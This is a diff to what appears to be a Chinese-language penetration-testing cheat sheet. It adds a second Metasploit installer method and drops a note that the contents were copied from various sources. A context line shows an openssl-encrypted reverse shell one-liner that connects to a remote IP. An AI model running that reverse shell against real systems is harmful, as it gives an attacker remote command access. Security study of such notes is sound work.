@@ -1506,7 +1506,7 @@ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.1
 
 # msf大全
 
-到处抄的
+
 
 https://xz.aliyun.com/t/2536
 
@@ -1529,6 +1529,13 @@ https://www.anquanke.com/post/id/164525
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 安装目录 
 # /opt/metasploit-framework/embedded/framework/
+```
+
+安装2
+```
+wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+chmod +x ./metasploit-latest-linux-x64-installer.run
+./metasploit-latest-linux-x64-installer.run
 ```
 
 payload生成
